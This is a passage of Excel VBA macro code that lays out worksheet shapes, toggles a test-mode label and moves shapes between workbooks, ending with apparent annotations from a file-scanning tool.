    End With
    
Next SHP

Shapes("Macros").Top = Range("a23").Top

Set IDirect = Nothing
Set Patch = Nothing
Set Collage = Nothing
Set Misc = Nothing

End Sub
Private Sub Visible_Shapes()

Dim SHP As Shape

For Each SHP In Me.Shapes
    SHP.Visible = True
Next
For Each SHP In Me.Shapes("Macros").GroupItems
    SHP.Top = Me.Range("A23").Top
Next

Set SHP = Nothing

End Sub
Private Sub Collage_Move()

Dim SB As Workbook, WS As Worksheet, WS1 As Worksheet, SHP As Shape

Set SB = Workbooks("Collage.xlsb")

Set WS1 = Workbooks.Add.Worksheets(1)

For Each WS In SB.Worksheets
    For Each SHP In WS.Shapes
        SHP.Cut
        With WS1
            .Paste
            With .Shapes(.Shapes.count)
                .Top = 0
                .Left = 0
            End With
        End With
    Next SHP
Next WS

End Sub
Attribute VB_Name = "WTI"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Weekly"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "F, 15, 10, MSForms, OptionButton"
Attribute VB_Control = "T, 14, 11, MSForms, OptionButton"

Private Sub T_Click()
    Me.Shapes("Test_Mode_State").TextFrame.Characters.Text = "Test Mode is ON"
End Sub
Private Sub F_Click()
    Me.Shapes("Test_Mode_State").TextFrame.Characters.Text = "Test Mode is OFF"
End Sub
Private Sub Worksheet_Activate()
Dim RR As Range

With Me.Shapes("Test_Mode_State").TopLeftCell
    If UUID Then
        Set RR = .Resize(Rowsize:=11, ColumnSize:=4)
    Else
        Set RR = .Resize(Rowsize:=11, ColumnSize:=4)
    End If
End With
'Debug.Print RR.Address
Call ZoomToRange(ZoomThisRange:=RR, PreserveRows:=True)

End Sub
Private Sub R_S_Click()
    Release_Schedule_F.Show
End Sub
Private Sub Re_Organize_Shapes()
Dim SHP As Shape

For Each SHP In Me.Shapes

    With SHP
        
        Select Case SHP.Name
        
            Case "Sorting"
                .Left = Shapes("Misc").Left + Shapes("Misc").Width
                Shapes("My_Date").Width = Shapes("My_Sort").Width
                Shapes("My_Date").Left = Shapes("My_Sort").Left
                .Width = Shapes("Progress").Width
                
            Case "Progress"
            
                .Left = Shapes("Sorting").Left
                
                .Top = Me.Shapes("Sorting").Top + Me.Shapes("Sorting").Height
                
            Case "Misc"
            
                    Shapes("Test_Mode_State").Left = Range("A4").Left
                    T.Width = F.Width
                    T.Left = (Shapes("Test_Mode_State").Width - T.Width) / 2
                    F.Left = T.Left
                    F.Height = T.Height
                    T.BackColor = Shapes("My_Date").Fill.ForeColor
                    F.BackColor = Shapes("My_Date").Fill.ForeColor
                    
'                    T.ForeColor = Shapes("My_Date").Fill.
'                    F.ForeColor = Shapes("My_Date").Fill.BackColor
                    
                    
                    Shapes("Release_Schedule").Left = Shapes("Test_Mode_State").Left
                    Shapes("Release_Schedule").Top = Shapes("Test_Mode_State").Top + Shapes("Test_Mode_State").Height
                    Shapes("Release_Schedule").Width = Shapes("Test_Mode_State").Width

        End Select
           
    If Not SHP Is Shapes("Progress") Then .Top = Range("a4").Top
     
    End With
    
Next
'Shapes.Top = Range("a3").Top
End Sub

' InQuest injected base64 decoded content
' z{b~'
' =!w5

INQUEST-PP=macro
